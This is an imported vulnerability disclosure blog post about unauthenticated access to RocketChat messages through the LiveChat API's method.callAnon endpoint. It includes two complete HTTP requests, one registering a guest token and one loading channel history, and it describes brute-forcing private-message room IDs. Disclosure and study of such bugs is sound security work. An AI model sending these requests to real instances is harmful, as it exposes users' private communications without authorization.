---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-03-01_rocketchat-unauthenticated-access-to-messages.md
original_filename: 2021-03-01_rocketchat-unauthenticated-access-to-messages.md
title: RocketChat - Unauthenticated access to messages
category: documents
detected_topics:
- access-control
- command-injection
- otp
- api-security
tags:
- imported
- documents
- access-control
- command-injection
- otp
- api-security
language: en
raw_sha256: 68ad74c27481f514780bcb5b210f4c45cde684d7bffafddf3b28ae6a3cb88d76
text_sha256: b7fcf18e8ecac88a4688a47cb920e1de4c669ad780f500ac0b5fa8156a7af1b0
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# RocketChat - Unauthenticated access to messages

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-03-01_rocketchat-unauthenticated-access-to-messages.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, api-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `68ad74c27481f514780bcb5b210f4c45cde684d7bffafddf3b28ae6a3cb88d76`
- Text SHA256: `b7fcf18e8ecac88a4688a47cb920e1de4c669ad780f500ac0b5fa8156a7af1b0`


## Content

---
title: "RocketChat - Unauthenticated access to messages"
page_title: "RocketChat - Unauthenticated access to messages — Securify"
url: "https://securifyinc.com/disclosures/rocketchat-unauthenticated-access-to-messages"
final_url: "https://securifyinc.com/disclosures/rocketchat-unauthenticated-access-to-messages"
authors: ["Rojan Rijal (@uraniumhacker)"]
programs: ["Rocket.Chat"]
bugs: ["Broken authorization"]
publication_date: "2021-03-01"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3851
---

# RocketChat - Unauthenticated access to messages

Mar 1

Written By [Rojan Rijal](/disclosures?author=603dc78c54d7950fdae7af75)

### About RocketChat

RocketChat is an open source communication platform used by various companies, universities and government agencies. 

### The vulnerability

I found a vulnerability in RocketChat’s LiveChat API endpoints which allowed accessing messages sent to public and private channels. In this blog, I will describe the vulnerability. 

RocketChat uses two specific method calls to define authentication requirements for API endpoints. The functions are _method.call_ and _method.callAnon_. As suggested by L275 and L276 on <https://github.com/RocketChat/Rocket.Chat/blob/develop/app/api/server/v1/misc.js#L276,> the _authRequired_ flag sets the rule for authentications. Any endpoints going through method.call will require user authentication while the same endpoints if it goes through method.callAnon will not require authentication. Knowing this information, I started to look into sensitive functions that did not perform additional authentication checks. For example, most of the functions performed a second validation through **_if (!Meter.userId())_** where if a user ID was not detected, it would either return empty data or redirect for authentications. One of the functions that did not perform this check was the **_livechat:registerGuest_** and allowed to register guest users. This endpoint is originally designed for LiveChat features which is optional however I could still call this endpoint directly via method.callAnon bypassing any form of authentications. 

> 
>  'livechat:registerGuest'({ token, name, email, department, customFields } = {}) {
>  const userId = Livechat.registerGuest.call(this, {
>  token,
>  name,
>  email,
>  department,
>  });

The LiveChat registration required **_token_** _,_**_email_** , **_name_** and **_department_** __ of the user. While a cookie is used to identify valid sessions of the user, a token can be used to identify sessions of LiveChat guest users for other LiveChat [methods](https://github.com/RocketChat/Rocket.Chat/tree/develop/app/livechat/server/methods). A sample request to add a guest would look like this: 

> POST /api/v1/method.callAnon/anythingresearch HTTP/1.1  
> Host: INSTANCE_IP:3000  
> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:84.0) Gecko/20100101 Firefox/84.0 Accept: */* Accept-Language: en-US,en;q=0.5  
> Accept-Encoding: gzip, deflate  
> Content-Type: application/json  
> X-Auth-Token: null  
> X-Requested-With: XMLHttpRequest  
> Content-Length: 174  
> Connection: close  
>  
> {"message":"{\"msg\":\"method\",\"method\":\"livechat:registerGuest\",\"params\":[{\"token\":\"ok4782\",\"name\":\"Security\",\"email\":\"attacker@email.com\"}],\"id\":\"123\"}"}

This will add a guest user with the token **_ok4782_** into the instance. After adding a user, I could then call another unauthenticated method called **livechat:loadHistory** to read the messages in various channels. While most channels of RocketChat use alpha-numeric IDs, the GENERAL channel simply uses **GENERAL** as the ID. This then allows accessing messages sent to GENERAL channel with the following request: 

> POST /api/v1/method.callAnon/nahman HTTP/1.1  
> Host: <instance_ip>:3000  
> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:84.0) Gecko/20100101 Firefox/84.0  
> Accept: */*  
> Accept-Language: en-US,en;q=0.5  
> Accept-Encoding: gzip, deflate  
> Content-Type: application/json  
> X-Requested-With: XMLHttpRequest  
> Content-Length: 169  
> Connection: close  
>  
> {"message":"{\"msg\":\"method\",\"method\":\"livechat:loadHistory\",\"params\":[{\"token\":\"ok4782\",\"rid\":\"GENERAL\"}],\"msg\":\"123\"}"}

#### Exploiting further

This could be exploited further to read private messages between users. Each user messages are also considered channels and can be used in the **_rid_** parameter. The channel ID for private messages is a concatenation of ID of two users in the messages. By retrieving the messages in GENERAL channel, I could then grab user IDs of all users who posted on the channel. After that, by using Burp Intruder’s ClusterBomb feature, you can iterate through all possible combinations to access private messages of the users.

### Exploit Nuclei Template

You can test for this vulnerability by using the following Nuclei YAML Template: <https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/rocketchat/unauth-message-read.yaml>

[nuclei-templates](/disclosures/tag/nuclei-templates)[sev:critical](/disclosures/tag/sev%3Acritical)[rocketchat](/disclosures/tag/rocketchat)[exploit](/disclosures/tag/exploit)

[ Rojan Rijal ](/disclosures?author=603dc78c54d7950fdae7af75)
